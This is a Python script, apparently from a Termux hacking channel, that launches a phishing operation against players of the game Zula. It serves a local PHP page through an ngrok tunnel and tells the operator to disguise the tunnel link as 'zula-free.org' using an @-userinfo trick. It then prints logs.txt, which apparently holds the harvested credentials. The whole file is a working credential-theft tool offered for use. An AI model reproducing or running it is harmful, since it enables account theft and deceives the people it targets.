import os
from colorama import Fore
import pyfiglet
from pyngrok import ngrok
from subprocess import Popen
print(Fore.GREEN)
os.system("clear")
print(Fore.RED+"""

8888888888P         888               888                        888      d8b
      d88P          888               888                        888      Y8P
     d88P           888               888                        888
    d88P   888  888 888  8888b.       88888b.   8888b.   .d8888b 888  888 888 88888b.   .d88b.
   d88P    888  888 888     "88b      888 "88b     "88b d88P"    888 .88P 888 888 "88b d88P"88b
  d88P     888  888 888 .d888888      888  888 .d888888 888      888888K  888 888  888 888  888
 d88P      Y88b 888 888 888  888      888  888 888  888 Y88b.    888 "88b 888 888  888 Y88b 888
d8888888888 "Y88888 888 "Y888888      888  888 "Y888888  "Y8888P 888  888 888 888  888  "Y88888
                                                                                            888
                                                                                       Y8b d88P
                                                                                        "Y88P"

 t.me/termux_learning
""")
with open("server","w") as phplog:
    Popen(("php","-S","localhost:8080","-t","zula"),stderr=phplog ,stdout=phplog)
link=ngrok.connect(8080,"http")
print(Fore.GREEN)
print(link)
print(Fore.GREEN+" youcan send link: https://www.zula-free.org-@yourlink")
input("")
os.system("cd zula")
os.system("cat logs.txt")
